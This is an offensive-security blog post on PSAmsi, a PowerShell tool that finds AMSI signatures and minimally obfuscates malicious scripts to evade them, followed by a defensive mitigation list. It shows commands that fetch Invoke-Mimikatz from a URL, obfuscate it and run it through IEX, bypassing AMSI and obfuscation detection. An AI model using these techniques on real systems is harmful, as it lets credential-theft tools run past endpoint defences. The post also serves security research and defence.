---
layout: post
title: "PSAmsi - Minimizing Obfuscation to Maximize Stealth"
date: 2017-11-13 10:00:00 -0600
tags: PSAmsi PowerShell
---

I recently released [PSAmsi](https://github.com/cobbr/PSAmsi), a tool for auditing and defeating AMSI signatures. While the stated goal of the project is to defeat AMSI signatures, it's real motivation is to simultaneously defeat obfuscation detection.

We already had a tool that was capable of *almost* always defeating PowerShell-based AMSI signatures in [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) written by [Daniel Bohannon](https://twitter.com/danielhbohannon) (I say "*almost*", I've never seen a case that Invoke-Obfuscation *does not* defeat all of the AMSI signatures within a script, but theoretically it could happen).

The problem becomes when defenders become smart to all of this obfuscation nonsense and instead of matching only on simple string signatures, implements some sort of obfuscation detection. [I've written a little on obfuscation detection in the past](({{site.baseurl}}/ObfuscationDetection.html)) and Daniel and [Lee Holmes](https://twitter.com/Lee_Holmes) have put out some [much more thorough research since then](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf).

The basic premise of obfuscation detection is that a heavily obfuscated script is immediately recognized as unusual by a human eye. For example, using Invoke-Obfuscation might result in the following output:

```
PS > $ExampleScript = {
    function Write-Num {
        Param ([Int] $Num)
        Write-Host $Num
    }  Write-Num 3
}
PS > Invoke-Obfuscation -ScriptBlock $ExampleScript -Command "Token\ALL\1" -Quiet

function wrITE`-`NUM {
  Param ([Int] ${N`Um})
  .("{0}{2}{1}"-f'Wr','t','ite-Hos') ${n`UM}
} .("{1}{0}{2}"-f 'u','Write-N','m') 3
```

Any human looking at the resulting script would immediately recognize that something looks wrong here, that this appears to be obfuscated. [Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation) automates the process of comparing a given PowerShell script to common characteristics of PowerShell scripts to determine if it is obfuscated.

Additionally, in the most recent release of Windows 10 (v1709), the Windows Defender Exploit Guard introduced several interesting [Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction) rules, including a rule that claims to **block** obfuscated scripts using the AMSI. This has the potential to upgrade obfuscation detection from post-execution detection with Revoke-Obfuscation to actual prevention of execution.

**While using as much obfuscation as possible seems, instinctively, like the stealthiest option, employing heavy obfuscation gifts defenders with an entirely new metric to identify malicious PowerShell threats.**

But why are we using such heavy obfuscation if we don't need to? There could be many goals of obfuscation, but if our only goal is to obfuscate around a set of signatures, then why obfuscate anything other than that set of signatures, providing defenders with another potential indicator of malicious activity? We can **minimize** our obfuscation with *just enough* obfuscation to not trigger any of those signatures.

To obfuscate only around a set of signatures, we first need to know what those signatures are. This is where [PSAmsi](https://github.com/cobbr/PSAmsi) comes in. It automates the process of discovering the AMSI signatures in a given malicious script (and subsequently obfuscating around them). To understand how PSAmsi does this, we first need a strong understanding of what exactly the AMSI is, and how it works.

# Intro to the AMSI

### Overview

The AMSI (Anti-Malware Scan Interface) is designed as a means for allowing applications to utilize their AntiMalware Provider (fka AntiVirus) to scan internal content at runtime in a way that was never quite possible with a traditional file-scanning AntiMalware product. This allows an application to choose what content needs to be scanned and react on the fly to the result. The application itself has greater knowledge of what needs to be scanned than a 3rd-party AntiMalware product. Additionally, the AMSI serves as a middle-man between requesting applications and the AntiMalware Provider that is AntiMalware Provider agnostic, and allows applications to request content scans *without even knowing what AntiMalware product will peform the scan*. The following diagram (provided by Microsoft) gives us a high-level view of how Microsoft envisions this working:

![Microsoft AMSI Diagram]({{site.baseurl}}/assets/images/microsoft-amsi-diagram.jpg)

As shown above, there are applications out there that already take advantage of the AMSI, namely: PowerShell, JScript, and VBScript.

PowerShell is a great example of an application that utilizes the AMSI to grant the AntiMalware Provider greater coverage than it would have without the AMSI. PowerShell submits Scriptlocks through the AMSI as they are executed, which has the added benefit of unraveling several forms of obfuscation, allowing the AntiMalware Provider to gain visibility it would not have otherwise.

However, the AMSI has the potential to do much more than it is even doing currently. An idea hinted at in [Microsoft's AMSI documentation](https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) is that it could eventually be used for domain and IP address reputation checks. Imagine if browser applications utilized the AMSI to query the AntiMalware Provider for IP reputation and domain categorization *before sending any HTTP requests to a requested site?* Ideas like this could be game changing for AntiMalware Providers, and could help to remove the stigma that all AV products do is uselessly scan files for hash matches.

### Using the AMSI

From an application's perspective, utilizing the AMSI involves calling a series of Win32 API functions: `AmsiInitalize`, `AmsiOpenSession`, `AmsiScanString`, `AmsiScanBuffer`, `AmsiCloseSession`, and `AmsiUninitialize`. These functions are all defined in the `amsi.dll`. At a high-level, it looks something like this:

![High-Level AMSI Diagram]({{site.baseurl}}/assets/images/my-dumb-amsi-diagram.png)

However, there is a little more detail in implementation. There is the notion of an `amsiContext` and an `amsiSession`. The idea is that the `amsiContext` is a reference to the application submitting content to be scanned (i.e. PowerShell), where the `amsiSession` is a reference to a stream of related content scans. An application can maintain one or many amsiSessions for correlating content across several scans. For instance, PowerShell may scan every ScriptBlock for a given PowerShell script in one amsiSession, while using a second amsiSession for every ScriptBlock in another PowerShell script. This allows 

For a developer considering implementing AMSI into their application, the following diagram could be a useful reference:

![AMSI Sequence Diagram]({{site.baseurl}}/assets/images/amsi-sequence-diagram.png)

Behind the scenes in the diagram shown above, the `amsi.dll` is making calls to the AntiMalware Provider. Unfortunately, there isn't a lot of publically available documentation of how that process works (that I am aware of).

For the requesting application, the AMSI offers a unique opportunity to scan selected content, and to react to the AntiMalware Provider's response in any way it would like to. For most applications, this probably means to stop execution of the content that was detected as malicious. For example, PowerShell will stop executing a PowerShell script that contains ScriptBlock(s) that contain malicious content. 

However, PSAmsi reacts to the `AMSI_RESULT` a little bit differently, as you will see in the **Finding AMSI Signatures** section below.

# Conducting AMSI Scans

Since *any* application can ask the AntiMalware provider if a given chunk of content is malicious, this is what PSAmsi does. It utilizes the interface as intended.

PSAmsi creates an in-memory module of the necessary Win32 API functions mentioned earlier with the help of [PSReflect](https://github.com/mattifestation/PSReflect), and exposes it as a PowerShell class named `PSAmsiScanner`. This class allows us to easily conduct AMSI scans to check arbitrary strings or buffers for malicious content:

```
PS > $Scanner = [PSAmsiScanner]::new()
PS > $Scanner.GetPSAmsiScanResult('test')
False
PS > $MaliciousUrl = 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1'
# GetPSAmsiScanResult accepts strings, ScriptBlocks, file paths, or URIs:
PS > $Scanner.GetPSAmsiScanResult([Uri]::new($MaliciousUrl))
True
# There are also PowerShell cmdlets that wrap the PSAmsiScanner class:
PS > Get-PSAmsiScanResult -ScriptString 'test'
False
PS > $Scanner = New-PSAmsiScanner
PS > Get-PSAmsiScanResult -ScriptUri $MaliciousUrl -PSAmsiScanner $Scanner
True
PS > $Scanner.AlertCount
1
```

The `PSAmsiScanner` is just a convenient mechanism for conducting AMSI scans within PowerShell, and probably has more defensive use cases outside of PSAmsi.

# Finding AMSI Signatures

Once we understand that the entire function of the AMSI is to tell *any* program if a given chunk of content is malicious, the actual signatures are a simple search algorithm away. 

PSAmsi utilizes the powerful AbstractSyntaxTree ("AST") built-in to PowerShell to identify the minimally-sized logical chunks of code in a script that are identified as malicious by the AntiMalware provider.

Essentialy, we just need to continually scan smaller pieces of the script until we identify the smallest piece that is detected as malicious. The AST just helps us to speed up the process and allows us to find the smallest *logical* pieces.

For instance, let's take our example script from before and it's corresponding AST:

![Example AST]({{site.baseurl}}/assets/images/example-ast.png)

Let's pretend that we have installed an AntiMalware Provider that detects the string "Write-Host $Num" as malicious. If we scanned every node of this AST using the `PSAmsiScanner`, we may get a result like this:

![Example AST Search]({{site.baseurl}}/assets/images/example-ast-search.png)

You can see that a sub-tree of detected nodes forms inside of the main tree, which I'll refer to as the "detection tree". All of the leaves of our detection tree (there could be multiple) are our resulting signatures.

PSAmsi's `Find-AmsiSignatures` function automates this discovery process for us:

```
PS > $Signatures = Find-AmsiSignatures -ScriptUri $MaliciousUrl
PS > $Signatures

StartOffset SignatureType        SignatureContent
----------- -------------        ----------------
      37213 CommandAst           Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
      39331 CommandAst           Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
      58744 CommandExpressionAst $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $Argum...
       2494 ParamBlockAst        Param(...
         27 PSToken              <#...
```

# Minimizing Obfuscation, Maximizing Stealth

With the knowledge of the exact AMSI signatures our AntiMalware Provider is searching for, the amount of obfuscation we actually need to do is drastically reduced. Let's take one of those signatures we just found with `Find-AmsiSignatures` as an example:

```
PS > $Signatures[0]
Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect`
PS > Get-PSAmsiScanResult $Signatures[0]
True
```

An `Invoke-Obfuscation` trick we can use to obfuscate variables is to simply wrap the variable name in curly braces:

```
PS > $ObfuscationTest = 'Add-Member NoteProperty -Name VirtualProtect -Value ${VirtualProtect}'
PS > Get-PSAmsiScanResult $ObfuscationTest
False
```

We have defeated the AMSI signature! And by only adding two characters! 

PSAmsi's `Get-MinimallyObfuscated` function automates the process of this minimal obfuscation on *each* of the signatures discovered by the `Find-AmsiSignatures` function, allowing us to successfully obfuscate and execute any malicious script:

```
PS > $ObfMimikatz = Get-MinimallyObfuscated -ScriptUri $MaliciousUrl
PS > $ObfMimikatz | IEX; Invoke-Mimikatz -Command Coffee

  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 20 modules * * */
ERROR mimikatz_initOrClean ; CoInitializeEx: 80010106

mimikatz(powershell) # Coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'
```

And the best part? This minimized form of obfuscation is extremely difficult to detect:

```
PS > Measure-RvoObfuscation -ScriptExpression $ObfMimikatz

Hash                                                               Obfuscated Source
----                                                               ---------- ------
BB06698FAFC19A076041D2510897EBB88F8E2F430A2AEDFB010611BBD82DC392A2 False      <Direct>
```

Now we are using obfuscation to defeat all of the AMSI signatures, and also avoid introducing that new obfuscation metric for defenders to utilize in identifying malicious PowerShell threats that we mentioned earlier. **We minimize our obfuscation, to maximize stealth.**

# Defense

We have arrived at the customary defensive mitigations portion present in any good offensive security blog post. I've tried my best to make this not just a checkbox to say I've recommended defensive mitigations, but a series of actionable steps defenders can take to protect themselves against *any* PowerShell threat, including payloads generated by PSAmsi. Nearly all of these defense ideas have been discussed at length in other places, but I'll try my best to summarize them here.

To start off, the good news for defenders is that PSAmsi generates a **ton** of AV alerts while it is searching for AMSI signatures. However, if attackers are utilizing PSAmsi correctly, they won't be executing it on any of your systems, and will only be executing payloads *generated* by PSAmsi.

Luckily, defenders have a wealth of options for protecting themselves from PowerShell threats. The following are a list of defensive steps that an organization can take to defend themselves against PowerShell threats, including payloads generated with PSAmsi. These are meant to be listed (roughly) in order of suggested implementation:

1. **Deploy PowerShell v5** (and remove PowerShell v2) - If you still have systems with PowerShell v2 installed, this is step one. Without PowerShell v5, defenders have 0 visibility into PowerShell scripts being executed in their environment. Attackers will not need to obfuscate their payloads to escape detection, much less need to minimize their obfuscation.

2. **Enable PowerShell ScriptBlock Logging** - Even before ensuring AMSI support, defenders should ensure they have enabled ScriptBlock logging on their endpoints. The AMSI will only help to protect Windows 10 and Server 2016 machines, while ScriptBlock logging can help defenders gain visibility wherever PowerShell is installed. Not only should ScriptBlock logging be enabled, ScriptBlock logs should be centrally collected and monitored for threats.

3. **AntiMalware Provider with AMSI Support** - The default Windows Defender installation in Windows 10 and Server 2016 comes with built-in AMSI support, and is enabled by default! Use a different AntiMalware Provider? Ensure that they offer support for the AMSI and that it is enabled. Realize that this protection only applies to Windows 10 and Server 2016 machines, and attempt to upgrade as many servers/workstations as possible to the latest Windows 10 and Server 2016 versions.

4. **Obfuscation Detection** - Implement some form of obfuscation detection. This could be done by collecting logs and analyzing them using Revoke-Obfuscation or another product, or with an AMSI AntiMalware Provider that blocks obfuscated content such as the ASR addition to Windows Defender.

5. **Improved AMSI Signatures** - To defeat minimized obfuscation, improved AMSI signatures are needed. The AMSI only provides an infrastructure for AntiMalware Providers to provide signatures. At the end of the day, detection relies upon a set of signatures. Unfortunately, most defenders do not have control over the signatures implemented by their AntiMalware Provider. Audit your AMSI signatures using PSAmsi, and apply pressure to your vendor to improve their signatures.

6. **Detection over Prevention** - Finally, realize that the AMSI is a great step in the direction for prevention, but is built as a platform for detecting **known** bad, not **all** bad. Prevention and the AMSI can never be totally relied on, and defenders should shift to thinking about **detection over prevention**. PowerShell logs, command line logs, and other event logs should be collected and constantly monitored for threats.

7. **Constrained Language Mode** - PowerShell's Constrained Language Mode (CLM) can be deployed alongside an Application WhiteListing (AWL) solution as a more robust means for preventing malicious PowerShell threats. This involves a shift of thinking abut blacklisting particular signatures and blacklisting obfuscated content, to assuming everything is malicious and whitelisting approved scripts and executable content. CLM permits only a subset of PowerShell's functionality, primarily Microsoft-signed cmdlets, and limits what an attacker can accomplish, even with administrative access. AWL can be difficult to implement correctly, and should always be tested in an audit (or non-blocking) mode first and introduced to an environment incremently.

8. **Just Enough Administration** - Just Enough Administration ("JEA") can be deployed to limit what PowerShell code can be executed *even further than Constrained Language Mode*. JEA allows defenders to deploy PowerShell in "No Language Mode" meaning that **no** PowerShell code can be executed, apart from a whitelisted set of functionality specified using JEA. For instance, maybe a DNS administrator needs to run `Restart-Service -Name DNS`. With JEA the administrator can be limited to *only* the `Restart-Service` cmdlet and *only* the `DNS` argument to the `-Name` parameter. This gives defenders very fine-grained control over what PowerShell code is permitted to run on a given system.

As you can see above, there is **a lot** that can be done to protect against PowerShell threats. PSAmsi becomes less and less effective as a defender implements each of the steps listed above.

As a defender, once you pass Step 6 - Detection over Prevention, you will be able to start detecting payloads generated by PSAmsi. Essentially, PSAmsi pushes the barrier to entry from Step 4 - Obfuscation Detection to Step 6. Once you exceed Step 6 towards 7 and 8, PSAmsi generated payloads will fail altogether.

# References

The following are useful references that I may or may not have mentioned earlier in this post:

* AMSI MSDN Reference - https://msdn.microsoft.com/en-us/library/windows/desktop/dn889588(v=vs.85).aspx
* ASR Rules - https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction
* PowerShell - The Blue Team - https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/
* Revoke-Obfuscation Whitepaper - https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf
* PowerShell Logging - https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html